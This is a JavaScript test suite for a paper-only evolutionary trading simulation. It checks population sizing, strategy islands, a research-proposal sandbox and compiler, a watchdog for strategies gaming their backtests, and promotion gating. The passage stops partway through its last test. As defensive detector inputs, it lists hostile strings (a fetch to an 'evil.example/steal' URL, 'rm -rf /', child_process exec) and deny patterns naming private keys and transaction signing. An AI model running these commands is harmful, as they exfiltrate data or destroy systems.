#!/usr/bin/env node
/**
 * EVOLVE Phase 5A validation suite — Controlled Research Swarm.
 *
 * Covers: configurable population (48/96/192 + arbitrary), strategy islands
 * (targets, migration, cross-species crossover, revival), the research
 * proposal schema + sandbox, the deterministic proposal compiler, research
 * memory persistence, the reward-hacking watchdog + quarantine, Arena-gated
 * promotion, ACTIVE/REDUCED_RISK/ABSTAIN, the shared market feed, and the
 * paper-only/no-execution guarantee.
 *
 * Dependency-free and fully offline (the default `mock` research provider
 * needs no LLM API key and no network) — same convention as
 * validate-arena.mjs / validate-phase41.mjs.
 *
 * Run with: npm run validate:phase5a
 */

import { mkdtemp, rm, readdir, readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { createMarketConfig } from "./market/config.mjs";
import { createMarketFeed } from "./market/feed.mjs";
import { createSeededRandom } from "./lib/random.mjs";
import { digestOf } from "./lib/hash.mjs";
import { PAPER_ONLY } from "./engine/paper.mjs";
import { createSimulation } from "./engine/simulation.mjs";
import { SPECIES, GENOME_KEYS, GENE_BOUNDS, randomGenome } from "./engine/genome.mjs";
import { islandTargetCounts, allocateBirths, largestRemainderAllocation, pickOtherIsland } from "./engine/islands.mjs";
import { ABSTAIN_STATE, abstentionDecision, riskMultiplierFor, FAMILY_NAMES, resolveFamily } from "./engine/families.mjs";
import { REGIMES, DEFAULT_DEPLOYMENT_GATES, ARENA_SCORE_VERSION } from "./arena/orchestrator.mjs";
import {
  validateProposal,
  containsExecutableArtifact,
  RESEARCHER_ROLES,
  PROPOSAL_SCHEMA_VERSION,
} from "./research/proposal-schema.mjs";
import { compileProposals, COMPILER_LIMITS } from "./research/compiler.mjs";
import { evaluateCandidate, WATCHDOG_VERDICT, parameterBoundarySaturation, clearQuarantine } from "./research/watchdog.mjs";
import {
  MEMORY_STATUS,
  saveProposal,
  listProposals,
  appendMemoryRecord,
  readMemoryIndex,
  createMemoryRecord,
  appendConclusion,
  loadPriorConclusions,
  saveCompiledCandidate,
  listCompiledCandidates,
} from "./research/memory.mjs";
import { mockProviderPropose, resolveResearchProvider } from "./research/provider.mjs";
import { runResearchCycle, buildEvidencePacket } from "./research/cycle.mjs";
import { promoteFromArenaLeaderboard, isQuarantined } from "./research/promote.mjs";

const cases = [];
function test(name, fn) {
  cases.push({ name, fn });
}
function fail(message) {
  throw new Error(message);
}
function assert(condition, message) {
  if (!condition) fail(message);
}
function assertEqual(actual, expected, message) {
  if (actual !== expected) fail(`${message} (expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)})`);
}
function assertFinite(value, message) {
  assert(Number.isFinite(value), `${message} (got ${value})`);
}
function assertNoNonFinite(value, pathLabel = "root") {
  if (value === null || value === undefined) return;
  if (typeof value === "number") {
    assert(Number.isFinite(value), `non-finite number at ${pathLabel}`);
    return;
  }
  if (Array.isArray(value)) {
    value.forEach((item, index) => assertNoNonFinite(item, `${pathLabel}[${index}]`));
    return;
  }
  if (typeof value === "object") {
    for (const [key, item] of Object.entries(value)) assertNoNonFinite(item, `${pathLabel}.${key}`);
  }
}

/* ============================================================================
 * Test fixtures
 * ==========================================================================*/

async function withTempRoot(fn) {
  const root = await mkdtemp(path.join(tmpdir(), "evolve-phase5a-"));
  try {
    return await fn(root);
  } finally {
    await rm(root, { recursive: true, force: true }).catch(() => {});
  }
}

async function runLiveSimulationGenerations({
  generations = 4,
  populationSize = 48,
  generationTicks = 15,
  envOverrides = {},
  seedLabel = "phase5a-live",
} = {}) {
  const config = createMarketConfig(
    {
      EVOLVE_MARKET_MODE: "synthetic",
      EVOLVE_POPULATION_SIZE: String(populationSize),
      EVOLVE_GENERATION_TICKS: String(generationTicks),
      EVOLVE_SYNTHETIC_UNIVERSE: "16",
      ...envOverrides,
    },
    { loadEnv: false },
  );
  const random = createSeededRandom(seedLabel);
  let clock = 1_760_000_000_000;
  const now = () => clock;
  const feed = createMarketFeed({
    config,
    fetchImpl: async () => {
      throw new Error("offline fixture only");
    },
    now,
    random,
  });
  const simulation = createSimulation({ config, feed, now, random, evolution: { enabled: true, ...config.evolution } });

  const ticks = generationTicks * generations + Math.ceil(generationTicks / 2);
  for (let i = 0; i < ticks; i += 1) {
    await feed.advance(clock);
    clock += config.engine.tickMs;
    simulation.advanceTick();
  }
  return { simulation, snapshot: simulation.snapshot() };
}

function validProposal(overrides = {}) {
  return {
    schemaVersion: PROPOSAL_SCHEMA_VERSION,
    proposalId: overrides.proposalId ?? "P-test-0001",
    authorRole: overrides.authorRole ?? "signal-researcher",
    hypothesis: overrides.hypothesis ?? "Momentum combined with wallet flow persists when organic buyers keep accumulating.",
    targetRegimes: overrides.targetRegimes ?? ["weak-risk-on"],
    abstainRegimes: overrides.abstainRegimes ?? [],
    parentFamilies: overrides.parentFamilies ?? ["Momentum x Wallet Flow"],
    changes: overrides.changes ?? { momentumWeight: [0.3, 0.5], flowWeight: 0.4 },
    rationale: overrides.rationale ?? "derived from observed regime and family statistics in this cycle",
    risks: overrides.risks ?? ["regime dependence"],
  };
}

/* ============================================================================
 * 1. Configurable population
 * ==========================================================================*/

for (const populationSize of [48, 96, 192]) {
  test(`1. Population stays at exactly ${populationSize} across generations`, async () => {
    const { snapshot } = await runLiveSimulationGenerations({ populationSize, generations: 3, generationTicks: 12 });
    assertEqual(snapshot.stats.population, populationSize, "population target must match EVOLVE_POPULATION_SIZE");
    assertEqual(snapshot.stats.alive, populationSize, "alive count must equal the configured population size");
    assert(snapshot.generation >= 2, `expected multiple generations to elapse, got generation ${snapshot.generation}`);
  });
}

test("2. An arbitrary sensible population (130) stays fixed across generations", async () => {
  const { snapshot } = await runLiveSimulationGenerations({ populationSize: 130, generations: 3, generationTicks: 12 });
  assertEqual(snapshot.stats.alive, 130, "arbitrary population size must be preserved exactly");
});

test("3. Invalid population values are rejected safely (clamped into range, never NaN)", () => {
  const tooSmall = createMarketConfig({ EVOLVE_POPULATION_SIZE: "-5" }, { loadEnv: false });
  assert(Number.isFinite(tooSmall.engine.population) && tooSmall.engine.population >= 12, "negative population must clamp to the minimum, not crash or go negative");

  const notANumber = createMarketConfig({ EVOLVE_POPULATION_SIZE: "banana" }, { loadEnv: false });
  assertEqual(notANumber.engine.population, 96, "non-numeric population must fall back to the documented default");

  const tooLarge = createMarketConfig({ EVOLVE_POPULATION_SIZE: "999999" }, { loadEnv: false });
  assert(tooLarge.engine.population <= 512, "oversized population must clamp to the maximum");
});

test("4. EVOLVE_POPULATION_SIZE and the legacy EVOLVE_POPULATION both work; the new name wins when both are set", () => {
  const legacyOnly = createMarketConfig({ EVOLVE_POPULATION: "64" }, { loadEnv: false });
  assertEqual(legacyOnly.engine.population, 64, "legacy EVOLVE_POPULATION must still work");

  const newOnly = createMarketConfig({ EVOLVE_POPULATION_SIZE: "72" }, { loadEnv: false });
  assertEqual(newOnly.engine.population, 72, "EVOLVE_POPULATION_SIZE must work");

  const both = createMarketConfig({ EVOLVE_POPULATION_SIZE: "80", EVOLVE_POPULATION: "40" }, { loadEnv: false });
  assertEqual(both.engine.population, 80, "EVOLVE_POPULATION_SIZE must take priority when both are set");
});

test("5. Births restore the exact population after every selection (birth/death bookkeeping consistent)", async () => {
  const { snapshot } = await runLiveSimulationGenerations({ populationSize: 48, generations: 4, generationTicks: 10 });
  const { bornTotal, terminatedTotal, population } = snapshot.stats;
  assertEqual(bornTotal - terminatedTotal, population, "born - terminated must equal the current population every tick");
});

test("6. Same seed/config initializes deterministically (byte-identical first snapshot)", async () => {
  const runOnce = async () => {
    const config = createMarketConfig({ EVOLVE_MARKET_MODE: "synthetic", EVOLVE_POPULATION_SIZE: "48", EVOLVE_SYNTHETIC_UNIVERSE: "16" }, { loadEnv: false });
    const random = createSeededRandom("phase5a-determinism");
    const now = () => 1_760_000_000_000;
    const feed = createMarketFeed({ config, fetchImpl: async () => { throw new Error("offline"); }, now, random });
    await feed.advance(now());
    const simulation = createSimulation({ config, feed, now, random, evolution: { enabled: true, ...config.evolution } });
    return simulation.snapshot().topAgents.map((a) => ({ species: a.species, genome: a.genome }));
  };
  const a = await runOnce();
  const b = await runOnce();
  assertEqual(JSON.stringify(a), JSON.stringify(b), "identical seed/config must produce identical initial population");
});

/* ============================================================================
 * 2. Strategy islands
 * ==========================================================================*/

test("7. islandTargetCounts splits evenly across 6 islands for 48/96/192 (8/16/32 each)", () => {
  for (const [populationSize, expectedEach] of [[48, 8], [96, 16], [192, 32]]) {
    const targets = islandTargetCounts(populationSize, SPECIES, {});
    for (const name of SPECIES) assertEqual(targets[name], expectedEach, `${name} target at population ${populationSize}`);
    assertEqual(Object.values(targets).reduce((a, b) => a + b, 0), populationSize, "targets must sum exactly to the population");
  }
});

test("8. islandTargetCounts always sums exactly to the population, for arbitrary sizes and explicit weights", () => {
  for (const populationSize of [1, 5, 47, 130, 500]) {
    const targets = islandTargetCounts(populationSize, SPECIES, {});
    assertEqual(Object.values(targets).reduce((a, b) => a + b, 0), populationSize, `sum mismatch at population ${populationSize}`);
  }
  const weighted = islandTargetCounts(96, SPECIES, { "Genesis Hunter": 30, Momentum: 10 });
  assertEqual(Object.values(weighted).reduce((a, b) => a + b, 0), 96, "explicit weights must still sum exactly to the population");
  assert(weighted["Genesis Hunter"] > weighted.Liquidity, "an island with a larger explicit weight must receive a larger share");
});

test("9. largestRemainderAllocation never returns negative or non-integer counts", () => {
  const result = largestRemainderAllocation({ a: 1, b: 2, c: 0 }, 7);
  for (const value of Object.values(result)) {
    assert(Number.isInteger(value) && value >= 0, `allocation must be a non-negative integer, got ${value}`);
  }
  assertEqual(Object.values(result).reduce((x, y) => x + y, 0), 7, "allocation must sum exactly to the requested total");
});

test("10. allocateBirths gives zero to islands already at/above target and distributes the rest exactly", () => {
  const deficits = { A: -5, B: 3, C: 2 };
  const allocation = allocateBirths(deficits, 5);
  assertEqual(allocation.A ?? 0, 0, "an over-target island must receive zero births");
  assertEqual((allocation.B ?? 0) + (allocation.C ?? 0), 5, "the full birth budget must land on under-target islands");
});

test("11. Island populations stay near their target across many generations (192 population, 6 islands)", async () => {
  const { snapshot } = await runLiveSimulationGenerations({ populationSize: 192, generations: 5, generationTicks: 10 });
  assert(Array.isArray(snapshot.islands) && snapshot.islands.length === SPECIES.length, "snapshot must report one row per island");
  const totalPop = snapshot.islands.reduce((sum, island) => sum + island.population, 0);
  assertEqual(totalPop, 192, "island populations must sum to the total population");
  for (const island of snapshot.islands) {
    assert(Math.abs(island.population - island.target) <= island.target, `island ${island.name} population ${island.population} drifted implausibly far from target ${island.target}`);
  }
});

test("12. pickOtherIsland always returns a different island than the one excluded, or null if none exists", () => {
  const random = createSeededRandom("pick-other");
  for (let i = 0; i < 50; i += 1) {
    const other = pickOtherIsland(SPECIES, "Momentum", random);
    assert(other !== "Momentum", "must never return the excluded island");
    assert(SPECIES.includes(other), "must return a real island name");
  }
  assertEqual(pickOtherIsland(["Solo"], "Solo", random), null, "must return null when no other island exists");
});

test("13. Migration is bounded by EVOLVE_ISLAND_MAX_MIGRATIONS (never exceeds the cap in one generation)", async () => {
  const { snapshot } = await runLiveSimulationGenerations({
    populationSize: 96,
    generations: 3,
    generationTicks: 10,
    envOverrides: { EVOLVE_ISLAND_MAX_MIGRATIONS: "2", EVOLVE_ISLAND_MIGRATION_RATE: "1" },
  });
  const totalMigrationsIn = snapshot.islands.reduce((sum, island) => sum + island.migrationsIn, 0);
  // Bounded per generation, and several generations elapsed — this only checks
  // the cap actually constrains the total rather than growing unbounded with
  // migrationRate=1 (every survivor would migrate every generation otherwise).
  assert(totalMigrationsIn <= 2 * snapshot.generation, `migrations ${totalMigrationsIn} exceeded the per-generation cap over ${snapshot.generation} generations`);
});

test("14. Disabling islands (EVOLVE_ISLANDS_ENABLED=false) still keeps the population exact", async () => {
  const { snapshot } = await runLiveSimulationGenerations({
    populationSize: 60,
    generations: 3,
    generationTicks: 10,
    envOverrides: { EVOLVE_ISLANDS_ENABLED: "false" },
  });
  assertEqual(snapshot.stats.alive, 60, "population must stay exact even with islands disabled");
});

/* ============================================================================
 * 3. Research proposal schema + sandbox
 * ==========================================================================*/

test("15. A well-formed proposal is accepted", () => {
  const { ok, errors } = validateProposal(validProposal());
  assert(ok, `expected a valid proposal to be accepted, errors: ${errors.join("; ")}`);
});

test("16. An unknown top-level field is rejected", () => {
  const { ok, errors } = validateProposal({ ...validProposal(), smuggledField: "anything" });
  assert(!ok, "a proposal with an unknown top-level field must be rejected");
  assert(errors.some((e) => e.includes("smuggledField")), "the rejection reason must name the offending field");
});

test("17. An unsupported genome field inside `changes` is rejected", () => {
  const { ok, errors } = validateProposal(validProposal({ changes: { notARealGene: 0.5 } }));
  assert(!ok, "an unsupported gene must be rejected");
  assert(errors.some((e) => e.includes("notARealGene")), "the rejection reason must name the offending gene");
});

test("18. A gene range that escapes GENE_BOUNDS is rejected", () => {
  const { ok } = validateProposal(validProposal({ changes: { riskFraction: [0.9, 0.99] } }));
  assert(!ok, "a range outside GENE_BOUNDS must be rejected");
});

const EXECUTABLE_PAYLOADS = [
  "eval('1+1')",
  "require('child_process').exec('ls')",
  "process.exit(1)",
  "() => fetch('http://evil.example/steal')",
  "javascript:alert(1)",
  "import('node:fs')",
  "bash -c 'rm -rf /'",
  "new Function('return 1')()",
  "${7*7}",
];

for (const payload of EXECUTABLE_PAYLOADS) {
  test(`19. Executable-looking content is rejected: ${JSON.stringify(payload).slice(0, 40)}`, () => {
    assert(containsExecutableArtifact(payload), `sandbox scan must flag: ${payload}`);
    const { ok } = validateProposal(validProposal({ hypothesis: `${payload} and organic buyers keep accumulating steadily` }));
    assert(!ok, `a proposal with executable content in hypothesis must be rejected: ${payload}`);
  });
}

test("20. Shell content specifically is rejected (bash / sh -c / cmd.exe)", () => {
  for (const shell of ["bash -c 'echo hi'", "sh -c 'echo hi'", "cmd.exe /c dir"]) {
    assert(containsExecutableArtifact(shell), `must flag shell content: ${shell}`);
  }
});

test("21. Every RESEARCHER_ROLES entry is a valid authorRole and produces an acceptable proposal", () => {
  for (const role of RESEARCHER_ROLES) {
    const { ok, errors } = validateProposal(validProposal({ authorRole: role, proposalId: `P-role-${role}` }));
    assert(ok, `role ${role} must produce a valid proposal, errors: ${errors.join("; ")}`);
  }
});

test("22. A binary gene proposed as a non-degenerate range is rejected", () => {
  const { ok } = validateProposal(validProposal({ changes: { contrarian: [0, 1] } }));
  assert(!ok, "a binary gene range must be pinned to [0,0] or [1,1], not a spread range");
});

/* ============================================================================
 * 4. Deterministic proposal compiler
 * ==========================================================================*/

test("23. Deterministic compilation: the same proposal compiles to a byte-identical genome every time", () => {
  const proposal = validProposal();
  const a = compileProposals({ proposals: [proposal] });
  const b = compileProposals({ proposals: [proposal] });
  assertEqual(JSON.stringify(a.compiled), JSON.stringify(b.compiled), "identical proposal input must compile identically");
  assert(a.compiled.length === 1, "expected exactly one compiled candidate");
});

test("24. Compiled genomes never exceed GENE_BOUNDS and carry only known genome keys", () => {
  const proposal = validProposal({ changes: { riskFraction: 0.2, stopLoss: 0.03 } });
  const { compiled } = compileProposals({ proposals: [proposal] });
  assert(compiled.length === 1, "expected a compiled candidate");
  const genome = compiled[0].genome;
  for (const key of Object.keys(genome)) {
    assert(GENOME_KEYS.includes(key), `compiled genome has an unknown key: ${key}`);
    const [lo, hi] = GENE_BOUNDS[key];
    assert(genome[key] >= lo && genome[key] <= hi, `compiled ${key}=${genome[key]} escapes GENE_BOUNDS [${lo}, ${hi}]`);
  }
});

test("25. The compiler's own limits are tighter than or equal to GENE_BOUNDS (risk/stop/take-profit/age)", () => {
  assert(COMPILER_LIMITS.maxRiskFraction <= GENE_BOUNDS.riskFraction[1], "compiler riskFraction ceiling must not exceed the gene bound");
  assert(COMPILER_LIMITS.minStopLoss >= GENE_BOUNDS.stopLoss[0], "compiler stopLoss floor must not be looser than the gene bound");
  assert(COMPILER_LIMITS.minTakeProfit >= GENE_BOUNDS.takeProfit[0], "compiler takeProfit floor must not be looser than the gene bound");

  const proposal = validProposal({ changes: { riskFraction: [0.24, 0.25], stopLoss: [0.01, 0.015] } });
  const { compiled } = compileProposals({ proposals: [proposal] });
  assert(compiled[0].genome.riskFraction <= COMPILER_LIMITS.maxRiskFraction, "compiled riskFraction must respect the compiler ceiling");
  assert(compiled[0].genome.stopLoss >= COMPILER_LIMITS.minStopLoss, "compiled stopLoss must respect the compiler floor");
});

test("26. An unresolvable parent family is rejected at compile time", () => {
  const proposal = validProposal({ parentFamilies: ["Not A Real Family"] });
  const { compiled, rejected } = compileProposals({ proposals: [proposal] });
  assertEqual(compiled.length, 0, "an unresolvable family must not compile");
  assertEqual(rejected.length, 1, "the rejection must be reported");
});

test("27. maxCompilations bounds the number of compiled candidates per cycle", () => {
  const proposals = FAMILY_NAMES.map((name, i) => validProposal({ proposalId: `P-cap-${i}`, parentFamilies: [name] }));
  const { compiled } = compileProposals({ proposals, maxCompilations: 2 });
  assertEqual(compiled.length, 2, "compilation must stop at maxCompilations");
});

test("28. Every CANDIDATE_FAMILIES name resolves via resolveFamily, including x/×/* separators", () => {
  for (const name of FAMILY_NAMES) {
    assert(resolveFamily(name), `family ${name} must resolve by its exact name`);
    assert(resolveFamily(name.replace(/\s*x\s*/, " × ")), `family ${name} must resolve with a × separator`);
  }
});

/* ============================================================================
 * 5. Research memory
 * ==========================================================================*/

test("29. Research memory persists and reloads proposals, memory records, and conclusions", async () => {
  await withTempRoot(async (root) => {
    const proposal = validProposal();
    await saveProposal(root, proposal, { status: MEMORY_STATUS.PROPOSED });
    const proposals = await listProposals(root);
    assertEqual(proposals.length, 1, "the saved proposal must be listable");
    assertEqual(proposals[0].proposal.proposalId, proposal.proposalId, "the reloaded proposal must match what was saved");

    const record = createMemoryRecord({ proposalId: proposal.proposalId, authorRole: proposal.authorRole, hypothesis: proposal.hypothesis, status: MEMORY_STATUS.TESTING });
    await appendMemoryRecord(root, record);
    const index = await readMemoryIndex(root);
    assertEqual(index.length, 1, "the memory record must be persisted and reloadable");

    await appendConclusion(root, { proposalId: proposal.proposalId, authorRole: proposal.authorRole, status: MEMORY_STATUS.TESTING, conclusion: "testing" });
    const conclusions = await loadPriorConclusions(root);
    assertEqual(conclusions.length, 1, "the conclusion must be persisted and reloadable");
  });
});

test("30. Research memory persists no secrets, non-finite numbers, or executable content on disk", async () => {
  await withTempRoot(async (root) => {
    const proposal = validProposal({ proposalId: "P-sanitize-1" });
    await saveProposal(root, proposal);
    const record = createMemoryRecord({ proposalId: proposal.proposalId, authorRole: proposal.authorRole, hypothesis: proposal.hypothesis, status: MEMORY_STATUS.TESTING, medianOosReturn: NaN, worstOosReturn: Infinity });
    await appendMemoryRecord(root, record);

    const files = [];
    async function walk(dir) {
      for (const entry of await readdir(dir, { withFileTypes: true })) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) await walk(full);
        else files.push(full);
      }
    }
    await walk(root);
    for (const file of files) {
      const text = await readFile(file, "utf8");
      assert(!/apiKey|secretKey|privateKey|JUPITER_API_KEY/i.test(text), `${file} must never contain a credential-shaped string`);
      assert(!/\bNaN\b|\bInfinity\b/.test(text), `${file} must never contain a non-finite JSON literal`);
      const parsed = JSON.parse(text);
      assertNoNonFinite(parsed, file);
    }
  });
});

test("31. Researchers consult memory: prior REJECTED proposals are referenced in the next cycle's rationale", () => {
  const priorConclusions = [{ proposalId: "P-old-1", authorRole: "signal-researcher", status: "REJECTED", conclusion: "single-mint dominance" }];
  const proposals = mockProviderPropose({
    evidence: { regimeDistribution: {}, costSummary: { meanCostDrag: 0.01 }, islandStats: [], priorConclusions },
    count: 6,
    seed: "memory-check",
    cycle: 2,
  });
  assert(proposals.some((p) => p.rationale.includes("P-old-1")), "at least one new proposal must reference the prior rejected proposal id");
});

test("32. resolveResearchProvider falls back to the offline mock for an unknown/unset provider name (no network, no API key)", () => {
  const resolved = resolveResearchProvider("some-llm-vendor");
  assertEqual(resolved.offline, true, "an unrecognized provider must resolve to the offline mock, never attempt a network call");
  assertEqual(typeof resolved.propose, "function", "the resolved provider must be callable");
});

/* ============================================================================
 * 6. Reward-hacking watchdog + quarantine
 * ==========================================================================*/

test("33. Single-mint dominance is flagged by the watchdog", () => {
  const evidence = { trades: 10, mintNotional: { mintA: 950, mintB: 50 }, costDrag: 0.01 };
  const result = evaluateCandidate(evidence, {});
  assert(result.flags.some((f) => f.flag === "single-mint-dominance"), "concentrated notional in one mint must be flagged");
});

test("34. Very-low trade count is flagged by the watchdog", () => {
  const evidence = { trades: 1, mintNotional: { mintA: 100 }, costDrag: 0.01 };
  const result = evaluateCandidate(evidence, { minTrades: 8 });
  assert(result.flags.some((f) => f.flag === "very-low-trade-count"), "trades below the configured minimum must be flagged");
});

test("35. Train -> OOS collapse is flagged by the watchdog", () => {
  const evidence = { trades: 10, mintNotional: { m: 100 }, trainReturn: 0.5, oosReturn: 0.02, costDrag: 0.01 };
  const result = evaluateCandidate(evidence, {});
  assert(result.flags.some((f) => f.flag === "train-oos-collapse"), "a large train->OOS gap must be flagged");
});

test("36. Stress collapse (0 of N stress profiles survived) is flagged by the watchdog", () => {
  const evidence = { trades: 10, mintNotional: { m: 100 }, stressTotal: 3, stressSurvived: 0, costDrag: 0.01 };
  const result = evaluateCandidate(evidence, {});
  assert(result.flags.some((f) => f.flag === "stress-collapse"), "surviving zero stress profiles must be flagged");
});

test("37. Enough flags -> QUARANTINED; a couple of flags -> WATCH; a clean candidate -> NORMAL", () => {
  const clean = evaluateCandidate({ trades: 20, mintNotional: { a: 40, b: 30, c: 30 }, costDrag: 0.01 }, {});
  assertEqual(clean.verdict, WATCHDOG_VERDICT.NORMAL, "a clean candidate must be NORMAL");

  const quarantined = evaluateCandidate(
    { trades: 1, mintNotional: { a: 100 }, costDrag: 0.5, trainReturn: 0.5, oosReturn: 0.01, stressTotal: 2, stressSurvived: 0 },
    { minTrades: 8 },
  );
  assertEqual(quarantined.verdict, WATCHDOG_VERDICT.QUARANTINED, "a candidate with many independent flags must be QUARANTINED");
});

test("38. QUARANTINED candidates can never self-clear; clearance requires a fresh NORMAL/WATCH evaluation", () => {
  const quarantined = { verdict: WATCHDOG_VERDICT.QUARANTINED };
  assertEqual(clearQuarantine(quarantined, { verdict: WATCHDOG_VERDICT.QUARANTINED }), false, "a repeat QUARANTINED verdict must not clear");
  assertEqual(clearQuarantine(quarantined, { verdict: WATCHDOG_VERDICT.NORMAL }), true, "a fresh NORMAL verdict must clear a prior quarantine");
});

test("39. parameterBoundarySaturation correctly detects genes pinned at their bounds", () => {
  const genome = randomGenome("Momentum", createSeededRandom("saturation-check"));
  genome.riskFraction = GENE_BOUNDS.riskFraction[1];
  genome.stopLoss = GENE_BOUNDS.stopLoss[0];
  const { share, saturated } = parameterBoundarySaturation(genome);
  assert(saturated.includes("riskFraction") && saturated.includes("stopLoss"), "pinned genes must be detected");
  assertFinite(share, "saturation share must be finite");
});

/* ============================================================================
 * 7. Controlled recursive research cycle (propose -> validate -> compile ->
 *    watchdog -> memory -> next cycle), and Arena-gated promotion
 * ==========================================================================*/

test("40. A full research cycle proposes, validates, compiles, and persists memory — offline, no LLM key", async () => {
  await withTempRoot(async (root) => {
    const evidence = buildEvidencePacket({ snapshot: { species: [], marketRegime: "NEUTRAL", researchRegime: "weak-risk-on", topAgents: [], paper: { costs: 1, startingCash: 100 }, stats: { population: 48 } }, islands: [], priorConclusions: [], cycle: 1 });
    const report = await runResearchCycle({ root, evidence, cycle: 1, seed: "cycle-test", proposalsPerCycle: 6, maxCompilations: 3 });
    assertEqual(report.proposed, 6, "the mock provider must produce the requested number of proposals");
    assert(report.compiled.length > 0, "at least one proposal should compile with valid inputs");
    assert(report.compiled.length <= 3, "compiled candidates must respect maxCompilations");

    const proposals = await listProposals(root);
    assert(proposals.length >= report.compiled.length, "compiled candidates must have a persisted proposal record");
    const compiledCandidates = await listCompiledCandidates(root);
    assertEqual(compiledCandidates.length, report.compiled.length, "every compiled candidate must be persisted for later Arena matching");

    const memory = await readMemoryIndex(root);
    assert(memory.length > 0, "the cycle must write research memory records");
    for (const record of memory) {
      assert(
        [MEMORY_STATUS.PROPOSED, MEMORY_STATUS.TESTING, MEMORY_STATUS.REJECTED].includes(record.status),
        `a research cycle must never itself write status ${record.status} — only PROPOSED/TESTING/REJECTED`,
      );
    }
  });
});

test("41. A research cycle never writes PROMISING, ARENA_SURVIVOR, or SHADOW_ELIGIBLE — researchers cannot self-promote", async () => {
  await withTempRoot(async (root) => {
    const evidence = buildEvidencePacket({ snapshot: { species: [], researchRegime: "sideways-chop", topAgents: [], paper: { costs: 0, startingCash: 100 }, stats: { population: 48 } }, islands: [], priorConclusions: [], cycle: 1 });
    for (let cycle = 1; cycle <= 3; cycle += 1) {
      await runResearchCycle({ root, evidence: { ...evidence, researchCycle: cycle }, cycle, seed: "no-self-promote", proposalsPerCycle: 6, maxCompilations: 3 });
    }
    const memory = await readMemoryIndex(root, { limit: 1000 });
    const forbidden = memory.filter((r) => [MEMORY_STATUS.PROMISING, MEMORY_STATUS.ARENA_SURVIVOR, MEMORY_STATUS.SHADOW_ELIGIBLE].includes(r.status));
    assertEqual(forbidden.length, 0, "no research-cycle-authored memory record may claim a promoted status");
  });
});

test("42. Promotion only happens from a real Arena leaderboard match (by genome digest), and never for a QUARANTINED family", async () => {
  await withTempRoot(async (root) => {
    const genomeA = { riskFraction: 0.11 };
    const genomeB = { riskFraction: 0.12 };
    await saveCompiledCandidate(root, { familyId: "F-promote-a", proposalId: "P-a", genome: genomeA, authorRole: "signal-researcher" });
    await saveCompiledCandidate(root, { familyId: "F-promote-b", proposalId: "P-b", genome: genomeB, authorRole: "risk-researcher" });

    const quarantinedRecord = createMemoryRecord({ proposalId: "P-b", authorRole: "risk-researcher", hypothesis: "h", candidateFamily: "F-promote-b", status: MEMORY_STATUS.TESTING });
    quarantinedRecord.watchdogVerdict = "QUARANTINED";
    await appendMemoryRecord(root, quarantinedRecord);

    const leaderboardRows = [
      { digest: digestOf(genomeA), status: "DEPLOYMENT CANDIDATE" },
      { digest: digestOf(genomeB), status: "DEPLOYMENT CANDIDATE" },
    ];
    const memoryRecords = await readMemoryIndex(root, { limit: 100 });
    const result = await promoteFromArenaLeaderboard({ root, leaderboardRows, memoryRecords });

    assert(result.promoted.some((p) => p.familyId === "F-promote-a" && p.to === MEMORY_STATUS.SHADOW_ELIGIBLE), "a matched, non-quarantined family must be promoted to SHADOW_ELIGIBLE");
    assert(result.skipped.some((s) => s.familyId === "F-promote-b"), "a quarantined family must never be promoted even with a matching leaderboard digest");
    assert(isQuarantined(memoryRecords, "F-promote-b"), "isQuarantined must detect the quarantine flag");
  });
});

test("43. A compiled candidate with no matching Arena leaderboard entry is skipped, not promoted", async () => {
  await withTempRoot(async (root) => {
    await saveCompiledCandidate(root, { familyId: "F-unmatched", proposalId: "P-unmatched", genome: { riskFraction: 0.05 }, authorRole: "signal-researcher" });
    const result = await promoteFromArenaLeaderboard({ root, leaderboardRows: [{ digest: "some-other-digest", status: "DEPLOYMENT CANDIDATE" }], memoryRecords: [] });
    assertEqual(result.promoted.length, 0, "no promotion may occur without a genome-digest match");
    assertEqual(result.skipped.length, 1, "the unmatched candidate must be reported as skipped");
  });
});

/* ============================================================================
 * 8. Researchers cannot alter Arena gates, scoring, or the paper-only guard
 * ==========================================================================*/

test("44. DEFAULT_DEPLOYMENT_GATES and ARENA_SCORE_VERSION are untouched by anything Phase 5A adds", () => {
  assert(DEFAULT_DEPLOYMENT_GATES && typeof DEFAULT_DEPLOYMENT_GATES === "object", "deployment gates must still exist");
  assertFinite(ARENA_SCORE_VERSION, "arena score version must still be a finite version number");
  assert(Object.isFrozen(DEFAULT_DEPLOYMENT_GATES), "deployment gates must remain frozen (no research module can mutate them)");
});

test("45. PAPER_ONLY remains true and no research module imports execution/signing primitives", async () => {
  assertEqual(PAPER_ONLY, true, "the paper-only guard must remain true");

  const FORBIDDEN_PATTERNS = [
    /sendTransaction/i,
    /sendRawTransaction/i,
    /signTransaction/i,
    /signAllTransactions/i,
    /partialSign/i,
    /fromSecretKey/i,
    /secretKey/i,
    /privateKey/i,
    /seedPhrase/i,
    /mnemonic/i,
    /wallet-adapter/i,
    /@solana\/web3\.js/i,
    /@solana\/kit/i,
    /new\s+Connection\s*\(/,
    /new\s+Transaction\s*\(/,
    /SystemProgram/i,
    /jup\.ag\/swap/i,
    /\/swap\/build/i,
    /swap-instructions/i,
    /broadcastTransaction/i,
  ];

  const projectRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
  const targets = [path.join(projectRoot, "scripts", "research"), path.join(projectRoot, "scripts", "engine", "islands.mjs"), path.join(projectRoot, "scripts", "engine", "families.mjs")];
  const findings = [];

  async function walk(dir) {
    let entries;
    try {
      entries = await readdir(dir, { withFileTypes: true });
    } catch {
      return; // a single-file target
    }
    for (const entry of entries) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        await walk(full);
        continue;
      }
      if (!/\.mjs$/.test(entry.name)) continue;
      const text = await readFile(full, "utf8");
      for (const pattern of FORBIDDEN_PATTERNS) {
        if (pattern.test(text)) findings.push(`${full} matched ${pattern}`);
      }
      if (/\bfetch\s*\(/.test(text)) findings.push(`${full} performs a network fetch — research machinery must stay offline`);
    }
  }

  for (const target of targets) {
    const text = await readFile(target, "utf8").catch(() => null);
    if (text !== null) {
      for (const pattern of FORBIDDEN_PATTERNS) if (pattern.test(text)) findings.push(`${target} matched ${pattern}`);
      continue;
    }
    await walk(target);
  }

  assertEqual(findings.length, 0, `forbidden execution-path patterns found: ${findings.join("; ")}`);
});

test("46. Research proposals cannot smuggle a shell/eval string past validation via any string field", () => {
  const fields = ["hypothesis", "rationale"];
  for (const field of fields) {
